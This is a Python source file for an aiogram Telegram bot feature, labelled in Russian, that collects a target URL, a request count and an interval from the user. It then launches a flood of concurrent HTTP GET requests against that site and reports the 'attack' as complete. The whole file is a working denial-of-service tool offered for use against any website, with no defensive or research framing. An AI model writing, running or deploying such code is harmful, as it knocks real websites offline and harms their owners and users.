from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram import types
from aiogram.dispatcher import FSMContext
import logging
from aiogram.contrib.middlewares.logging import LoggingMiddleware
import asyncio
import aiohttp
class Form(StatesGroup):
    url = State()
    num_requests = State()
    interval = State()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

TIMEOUT = 30
CONCURRENT_REQUESTS = 999999999


async def ddos_attack(bloom):
    bloom.middleware.setup(LoggingMiddleware())
    @bloom.callback_query_handler(text_startswith="ddos")
    async def faq_button_click(call: types.CallbackQuery):
        await call.answer()
        await Form.url.set()
        await call.message.reply("Привет! Введи ссылку на сайт.")

    @bloom.message_handler(state=Form.url)
    async def process_url(message: types.Message, state: FSMContext):
        async with state.proxy() as data:
            data['url'] = message.text

        await Form.next()
        await message.reply("Теперь введи количество запросов.")

    @bloom.message_handler(lambda message: not message.text.isdigit(), state=Form.num_requests)
    async def process_num_requests_invalid(message: types.Message):
        return await message.reply("Количество запросов должно быть числом.\nСколько запросов вы хотите сделать? (введите число)")

    @bloom.message_handler(lambda message: message.text.isdigit(), state=Form.num_requests)
    async def process_num_requests(message: types.Message, state: FSMContext):
        async with state.proxy() as data:
            data['num_requests'] = int(message.text)

            markup = types.ReplyKeyboardRemove()

            await Form.next()
            await message.reply("Теперь введите интервал между запросами (в секундах).", reply_markup=markup)
    @bloom.message_handler(lambda message: not message.text.replace('.', '').isdigit(), state=Form.interval)
    async def process_interval_invalid(message: types.Message):
        return await message.reply("Интервал должен быть числом (дробное число через точку).\nВведите интервал между запросами (в секундах).")

    @bloom.message_handler(lambda message: message.text.replace('.', '').isdigit(), state=Form.interval)
    async def process_interval(message: types.Message, state: FSMContext):
        async with state.proxy() as data:
            data['interval'] = float(message.text)

            await Form.next()
            await message.reply("Готово! Начинаю атаку...\nЭто может занять некоторое время.")

            await start_attack(data['url'], data['num_requests'], data['interval'], message.chat.id)

    async def send_request(session, url):
        try:
            async with session.get(url, timeout=TIMEOUT) as response:
                response.raise_for_status()
                logger.info(f"Ответ от {url}: {response.status}")
        except aiohttp.ClientError as ce:
            logger.error(f"Ошибка клиента при выполнении запроса: {ce}")
        except asyncio.TimeoutError:
            logger.error(f"Время ожидания истекло при выполнении запроса: {url}")
        except Exception as e:
            logger.error(f"Произошла ошибка при выполнении запроса: {e}")


    async def start_attack(url, num_requests, interval, chat_id):
        connector = aiohttp.TCPConnector(limit_per_host=CONCURRENT_REQUESTS)  
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for _ in range(num_requests):
                task = asyncio.create_task(send_request(session, url))
                tasks.append(task)
                await asyncio.sleep(interval)

            await asyncio.gather(*tasks)

        await bloom.bot.send_message(chat_id, "Атака завершена.")
        ddos_attack(bloom)

 


 